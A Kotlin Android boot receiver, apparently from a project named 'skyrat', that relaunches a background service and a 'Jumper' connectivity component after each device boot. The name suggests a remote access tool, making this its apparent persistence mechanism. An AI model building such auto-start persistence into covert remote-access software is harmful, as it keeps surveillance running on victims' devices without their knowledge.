package com.techsky.skyrat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiverClass"
        // Define custom actions as constants since they're not in standard Android Intent class
        private const val ACTION_QUICKBOOT_POWERON = "android.intent.action.QUICKBOOT_POWERON"
        private const val ACTION_REBOOT = "android.intent.action.REBOOT"
        private const val HTC_QUICKBOOT_POWERON = "com.htc.intent.action.QUICKBOOT_POWERON"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Boot receiver triggered with action: ${intent.action}")

        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            ACTION_QUICKBOOT_POWERON,
            ACTION_REBOOT,
            HTC_QUICKBOOT_POWERON -> {
                Log.d(TAG, "Device boot detected, starting services")
                startBackgroundServices(context)
            }
        }
    }

    private fun startBackgroundServices(context: Context) {
        try {
            // Start MainService
            val serviceIntent = Intent(context, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
                Log.d(TAG, "Started foreground service on boot")
            } else {
                context.startService(serviceIntent)
                Log.d(TAG, "Started service on boot")
            }

            // Also initialize Jumper for additional connectivity
            val jumper = Jumper(context)
            jumper.init()
            Log.d(TAG, "Jumper initialized on boot")

        } catch (e: Exception) {
            Log.e(TAG, "Error starting services on boot: ${e.message}", e)
        }
    }
}